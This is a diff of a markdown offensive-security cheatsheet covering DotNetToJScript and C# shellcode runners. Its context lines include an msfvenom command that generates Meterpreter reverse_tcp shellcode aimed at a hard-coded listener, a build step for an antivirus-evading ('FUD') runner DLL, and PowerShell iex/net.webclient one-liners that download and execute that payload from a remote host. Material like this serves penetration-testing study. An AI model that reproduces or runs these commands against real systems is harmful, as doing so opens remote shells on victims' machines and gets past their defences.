@@ -4,7 +4,13 @@ Under Construction
 ***
 A cheatsheet compiled so you have everything you need in one place. I'd like to say thank you to all the authors of the repo's listed here, without you this would not exist.
 # Table of Contents
-[Csharp](#CSharp)
+
+[DotnetToJScript](#DotNetToJscript)
+[CSharp]
+- [Meterpreter FUD DLL](##Meterpreter FUD DLL)
+## DLL Injection
+## Shellcode Runner
+## Process injection
 
 ***
 # DotNetToJscript
@@ -95,15 +101,15 @@ self.close();
 # CSharp
 
 
-# Meterpreter FUD DLL
+## Meterpreter FUD DLL
 
-## Create msfvenom shellcode
+### Create msfvenom shellcode
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.36 LPORT=3333 -f csharp 
 ```
 
-## Place shellcode in and run
+### Place shellcode in and run
 
 ```csharp
 using System;
@@ -181,7 +187,7 @@ namespace XOR_encoder
 
 <br>
 
-## Copy XOR shellcode and place into 
+### Copy XOR shellcode and place into 
 
 ```csharp
 using System;
@@ -241,14 +247,14 @@ namespace ClassLibrary1
 ```
 <br>
 
-## Build your DLL
+### Build your DLL
 
 ```
 sudo csc /target:library /out:runner.dll runner.cs 
 ```
 <br>
 
-## Create Powershell Script to load the dll
+### Create Powershell Script to load the dll
 
 ```powershell
 $data = (new-object net.webclient).downloadData('http://IP:PORT/runner.dll')
@@ -266,7 +272,7 @@ Host your powershell script
 ```
 <br>
 
-## Bring it Home
+### Bring it Home
 ```
 iex(new-object net.webclient).downloadstring('http://IP:80/runner.ps1')
 ```
